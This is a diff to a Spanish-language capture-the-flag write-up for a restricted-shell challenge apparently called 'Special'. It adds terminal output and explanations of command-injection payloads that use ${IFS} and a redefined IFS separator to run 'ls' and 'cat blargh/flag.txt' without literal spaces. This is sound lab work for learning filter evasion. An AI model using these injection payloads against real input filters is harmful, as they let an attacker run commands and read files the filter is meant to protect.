@@ -97,8 +97,10 @@
 		Special$ ${IFS}ls;b=blargh
 		${IFS}ls;b=blargh 
 		blargh
-		Special$ $(IFS=\;b=ls\blargh\;$b)
-		$(IFS=\;b=ls\blargh\;$b) 
+		Special$ $(IFS=+;b=ls+blargh+;$b)
+		$(IFS=+;b=ls+blargh+;$b) 
+		sh: 1: flag.txt: not found
+		Special$  
 		Special$                           
 		Traceback (most recent call last):
 		  File "/usr/local/Special.py", line 19, in <module>
@@ -134,8 +136,9 @@
 		Al redefinir `IFS` con otro carácter, por ejemplo `IFS=-;`, se podía reemplazar el espacio en los comandos.  
 		Se utilizaron variables y ejecución de comandos para evadir la corrección de “Special”: 
 
-		`${IFS}ls;b=blargh` → ejecuta `ls` y luego separa el comando `b=blargh` usando `;`. Como `$(ls)` intentó ejecutar `blargh`, eso indica que `ls` mostró un directorio llamado `blargh`
+		`${IFS}ls;b=blargh` → ejecuta `ls` y luego separa el comando `b=blargh` usando (asignando blargh a b) `;`. Como `$(ls)` intentó ejecutar `blargh`, eso indica que `ls` mostró un directorio llamado `blargh`.
 		`$(ls)` → intentó ejecutar la salida de `ls` como comando; el shell intentó correr `blargh` como si fuera un ejecutable y falló (`sh: 1: blargh: not found`).
+		`$(IFS=+;b=ls+blargh+;$b)` → ejecuta `b` como el si fuera el comando `ls blargh` de esta forma listando lo que hay en el directorio, ya que posteriormente `$b` lo ejecuta y/o llama.
 		`$(IFS=+;b=cat+blargh/flag.txt+;$b)` → ejecuta `cat blargh/flag.txt` usando `+` como separador, mostrando la bandera sin usar espacios literales.
 
 /		 3. Resultados: 
